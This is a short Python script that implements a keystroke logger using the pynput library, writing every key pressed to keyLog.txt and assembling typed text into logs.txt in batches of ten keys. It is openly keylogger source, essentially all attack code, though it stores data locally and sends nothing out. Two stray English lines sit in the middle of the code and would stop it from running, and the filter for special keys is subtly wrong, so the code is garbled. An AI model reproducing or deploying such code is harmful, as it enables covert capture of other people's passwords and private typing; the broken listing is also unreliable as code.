from pynput.keyboard import Key, Listener
import os
import logging

logging.basicConfig(filename = ("keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

count =0
keys = []
the code is not a code .
it is waht is it.
if os.path.exists("logs.txt"):
    os.remove("logs.txt")
open("keyLog.txt", 'a').close()

def on_press(key):
    global keys , count
    logging.info(str(key))
    keys.append(str(key))
    count += 1
    print("{0} pressed ".format(key))
    # print("###" + str(keys))
    if count >= 10 :
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("logs.txt","a") as f :
        message = ""
        for key in keys:
            k = key.replace("'","")
            if key == "Key.space":
                k = " " 
            elif key == "Key.enter":
                k = "\n"
            elif key.find("Key")>0:
                k = ""
            message += k
        print(message)
        f.write(message)

def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press , on_release = on_release) as listener:
    listener.join()